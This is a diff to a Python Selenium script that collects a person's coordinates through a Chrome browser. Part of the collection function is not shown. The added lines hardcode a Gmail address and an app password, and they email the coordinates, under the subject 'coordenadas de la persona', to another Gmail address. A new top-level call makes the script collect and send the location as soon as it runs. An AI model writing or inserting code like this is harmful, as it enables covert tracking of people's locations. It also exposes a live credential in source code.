@@ -1,5 +1,21 @@
 from selenium import webdriver
 import time
+from email.message import EmailMessage
+import smtplib
+
+EMAIL = 'carlossalazarcoder@gmail.com'
+PASSWORD_EMAIL = 'yebd risv uatk yvka'
+
+def send_email(to, subject, content):
+    msg = EmailMessage()
+    msg["From"] = EMAIL
+    msg["To"] = to
+    msg["Subject"] = subject
+    msg.set_content(content)
+    # Enviar el correo
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
+        smtp.login(EMAIL, PASSWORD_EMAIL)
+        smtp.send_message(msg)
 
 def get_coords():
     driver = webdriver.Chrome()
@@ -31,5 +47,9 @@ def get_coords():
         time.sleep(1)
 
     print(coords)
+    send_email(to='carloseliassalazaryunes@gmail.com', subject=f'coordenadas de la persona', content=f'{coords}')
 
     driver.quit()
+
+
+get_coords()
